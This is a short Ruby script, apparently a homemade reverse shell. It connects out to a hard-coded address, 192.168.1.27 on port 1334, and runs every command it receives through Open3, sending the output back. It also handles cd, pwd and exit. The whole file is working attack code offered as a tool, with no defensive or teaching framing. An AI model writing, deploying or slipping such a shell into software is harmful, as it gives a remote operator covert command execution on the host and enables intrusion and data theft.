#!/usr/bin/ruby
#-*- coding:utf-8 -*-
#Author : Unamed

require 'open3'
require 'socket'
require 'fileutils'
require 'pp'

RHOST = "192.168.1.27" 
PORT = "1334"
buffer = 4096

def main(rhost,rport,buffer)
  s = TCPSocket.new(rhost,rport)
  s.puts('\n')
  s.print("#{Dir.pwd}>")
  while true
    begin
      data = s.recv(buffer)
      
      if data.start_with? "exit"
        break
      
      elsif data.start_with? " "
        s.puts('[*] Error Sent Command !')

      elsif data.start_with? "pwd"
        s.puts("#{Dir.pwd}")

      elsif data.start_with? "cd"
        data_cd = data.split(' ')[1]
        path_check = File.directory? data_cd
        if path_check ==true
          FileUtils.cd(data_cd)
          #s.puts("[*] cd => #{data_cd}")
        else
          s.puts("[*] Path Not Found !")
        end
      
      else
        stdout, stderr, stdin, command = Open3.capture3(data)
        s.puts(stdout+stderr)
      end
      s.print("#{Dir.pwd}>")
    
    rescue SignalException => e
      s.puts("[*] CTRL+C")
    rescue Exception => exception_error
      s.puts("[*] Please Sent Data !")
      s.print("#{Dir.pwd}>")
    end
  end
end

if __FILE__ == $0
  main(RHOST,PORT,buffer)
end